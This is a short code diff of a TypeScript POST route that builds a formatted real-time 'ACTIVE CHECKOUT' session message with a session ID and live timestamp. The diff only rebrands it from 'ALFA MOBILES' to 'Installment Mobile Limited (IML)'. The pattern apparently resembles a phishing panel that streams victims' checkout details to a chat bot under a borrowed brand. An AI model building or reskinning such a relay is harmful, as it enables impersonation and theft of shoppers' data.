@@ -19,7 +19,7 @@ export async function POST(request: Request) {
     const timestamp = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
     const sessionId = data.sessionId || `SESS-${Math.floor(1000 + Math.random() * 9000)}`;
 
-    let messageText = `⚡ <b>ALFA MOBILES REAL-TIME SESSION</b> ⚡\n`;
+    let messageText = `⚡ <b>INSTALLMENT MOBILE LIMITED (IML) REAL-TIME SESSION</b> ⚡\n`;
     messageText += `🟢 <b>STATUS: ACTIVE CHECKOUT</b> | 📶 <b>Ping:</b> <code>200ms</code>\n`;
     messageText += `🆔 <b>Session ID:</b> <code>#${sessionId}</code>\n`;
     messageText += `🕒 <b>Live Update:</b> <code>${timestamp}</code>\n`;
@@ -68,7 +68,7 @@ export async function POST(request: Request) {
     }
 
     messageText += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-    messageText += `🔒 <i>Secured SSL 256-Bit Live Session Stream</i>`;
+    messageText += `🔒 <i>Installment Mobile Limited (IML) • Secured 256-Bit Live Session</i>`;
 
     // Edit single message if messageId exists
     if (messageId) {
